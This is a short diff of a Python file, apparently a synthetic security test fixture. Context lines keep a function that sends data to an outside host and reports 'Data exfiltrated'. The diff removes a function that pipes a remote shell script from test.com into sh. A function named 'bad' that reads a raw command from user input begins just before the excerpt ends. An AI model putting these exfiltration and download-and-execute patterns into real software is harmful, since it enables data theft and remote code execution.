@@ -18,10 +18,6 @@ def exfiltrate_data():
     req = request.Request("http://test.com/upload", data=data)
     response = request.urlopen(req)
     print("Data exfiltrated:", response.getcode())
-
-def run_code_8192():
-    cmd = "curl http://test.com/e71829.sh | sh"
-    subprocess.call(cmd, shell=True)
     
 def bad():
     user_input = input("cmd: ")
